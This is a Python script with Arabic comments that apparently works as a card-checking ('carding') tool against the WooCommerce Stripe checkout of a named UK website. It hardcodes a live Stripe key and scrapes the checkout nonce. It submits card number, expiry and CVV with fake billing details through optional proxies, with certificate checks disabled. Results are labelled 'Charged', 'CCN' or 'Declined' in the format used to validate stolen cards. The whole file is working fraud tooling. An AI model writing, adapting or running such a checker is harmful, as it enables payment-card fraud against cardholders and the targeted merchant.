"""
بوابة الدفع: Stripe Charge (WooCommerce)
الموقع: ietuk.co.uk
نوع البوابة: Stripe Charge (WooCommerce)
تدفق الطلبات:
1. GET /checkout/ -> استخراج Stripe publishable key و nonce
2. POST https://api.stripe.com/v1/payment_methods -> الحصول على pm_id
3. POST /?wc-ajax=checkout -> إرسال طلب الدفع النهائي وتصنيف النتيجة
"""
import aiohttp
import asyncio
import uuid
import ssl
import re


async def req1_get_checkout_data(
    session: aiohttp.ClientSession,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الخطوة 1: جلب pk_live و nonce من صفحة الدفع."""
    try:
        async with session.get(
            "https://ietuk.co.uk/checkout/",
            proxy=proxy_url,
        ) as r:
            text = await r.text()

        nonce_match = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', text)
        nonce = nonce_match.group(1) if nonce_match else ""
        # استخدام الـ pk_live المذكور في المتطلبات
        pk = "pk_live_51PVC6sFzbukajckZRX9IVkSEB1bcI2g831r7HgD4VK0ZAk2U0572Ya56wQXlyqGdVM62Fj7SXlR7oCSwyJEmq3ZG002t8GWayN"
        return pk, nonce
    except Exception as e:
        raise RuntimeError(f"req1_get_checkout_data failed: {e}") from e


async def req2_create_payment_method(
    session: aiohttp.ClientSession,
    pk: str,
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 2: إنشاء Payment Method عبر Stripe API."""
    headers = {
        "Authorization": f"Bearer {pk}",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {
        "type": "card",
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
    }
    try:
        async with session.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=headers,
            data=data,
            proxy=proxy_url,
        ) as r:
            res = await r.json(content_type=None)
            pm_id = res.get("id")
            if not pm_id:
                error_msg = res.get("error", {}).get("message", "Invalid Payment Method")
                raise RuntimeError(error_msg)
            return pm_id
    except RuntimeError:
        raise
    except Exception as e:
        raise RuntimeError(f"req2_create_payment_method failed: {e}") from e


async def req3_submit_checkout(
    session: aiohttp.ClientSession,
    pm_id: str,
    nonce: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 3: إرسال طلب الدفع النهائي للموقع."""
    checkout_data = {
        "billing_first_name": "John",
        "billing_last_name": "Doe",
        "billing_company": "",
        "billing_country": "GB",
        "billing_address_1": "10 Downing Street",
        "billing_address_2": "",
        "billing_city": "London",
        "billing_state": "",
        "billing_postcode": "SW1A 2AA",
        "billing_phone": "07700900123",
        "billing_email": f"johndoe{uuid.uuid4().hex[:4]}@gmail.com",
        "order_comments": "",
        "payment_method": "stripe",
        "woocommerce-process-checkout-nonce": nonce,
        "_wp_http_referer": "/checkout/",
        "stripe_payment_method": pm_id,
    }
    try:
        async with session.post(
            "https://ietuk.co.uk/?wc-ajax=checkout",
            data=checkout_data,
            proxy=proxy_url,
        ) as r:
            return await r.text()
    except Exception as e:
        raise RuntimeError(f"req3_submit_checkout failed: {e}") from e


async def process_ST_1_charge(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الدالة الرئيسية لفحص البطاقة عبر بوابة Stripe Charge (WooCommerce)."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    timeout = aiohttp.ClientTimeout(total=20)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            pk, nonce = await req1_get_checkout_data(session, proxy_url)
            pm_id = await req2_create_payment_method(session, pk, cc, mes, ano, cvv, proxy_url)
            response_text = await req3_submit_checkout(session, pm_id, nonce, proxy_url)

    except RuntimeError as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", str(e)
    except Exception as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Error: {e}"

    if "order-received" in response_text or "thank-you" in response_text:
        return f"𝐂𝐡𝐚𝐫𝐠𝐞𝐝 ✅ | {cc}|{mes}|{ano}|{cvv}", "Order Successful"
    elif "cvc" in response_text or "incorrect_cvc" in response_text:
        return f"𝐂𝐂𝐍 ♻️ | {cc}|{mes}|{ano}|{cvv}", "CVC Incorrect"
    else:
        try:
            error_msg = re.search(r"<li>(.*?)</li>", response_text).group(1)
        except Exception:
            error_msg = "Declined"
        return f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ | {cc}|{mes}|{ano}|{cvv}", error_msg
